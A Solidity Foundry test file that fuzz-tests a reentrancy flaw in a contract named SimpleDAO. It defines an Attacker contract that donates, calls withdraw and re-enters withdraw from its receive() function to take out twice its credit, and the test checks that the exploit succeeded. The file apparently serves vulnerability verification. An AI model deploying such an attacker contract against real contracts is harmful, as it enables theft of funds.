
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function requires the attacker to have credit in the DAO

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the DAO to establish credit
        victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        victim.withdraw(val);

        // 4. Verify Success Conditions
        // The attack is successful if we received more than we should have (2x the deposit)
        // Due to reentrancy, we withdraw twice but only had credit for one withdrawal
        uint256 finalBalance = address(this).balance;
        uint256 expectedGain = val * 2; // We should get val twice due to reentrancy
        
        if (finalBalance >= initialSnapshot + expectedGain) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the withdraw function before state is updated
            victim.withdraw(storedAttackVal);
        }
    }
}
